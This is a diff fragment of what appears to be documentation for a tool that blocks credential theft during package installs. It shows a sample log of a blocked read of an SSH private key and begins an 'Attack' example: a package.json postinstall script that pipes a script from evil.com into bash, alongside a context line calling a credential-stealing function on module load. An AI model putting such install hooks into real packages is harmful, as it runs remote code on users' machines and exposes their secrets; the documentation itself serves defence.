@@ -214,3 +214,15 @@ NODE_MODULE_INIT() { StealCredentials(); }
 
 **Protection:**
 ```
+[2024-12-06 10:15:23] [CRIT] 🚨 CREDENTIAL THEFT ATTEMPT | node-gyp (PID 12345) 
+  -> /Users/rahul/.ssh/id_rsa | Reason: npm install process accessing credentials
+[2024-12-06 10:15:23] [WARN] BLOCKED READ | DENIED
+```
+
+### Example 2: Python Postinstall Backdoor
+
+**Attack:**
+```json
+{
+  "scripts": {
+    "postinstall": "python3 -c 'import os; os.system(\"curl https://evil.com/backdoor.sh | bash\")'"
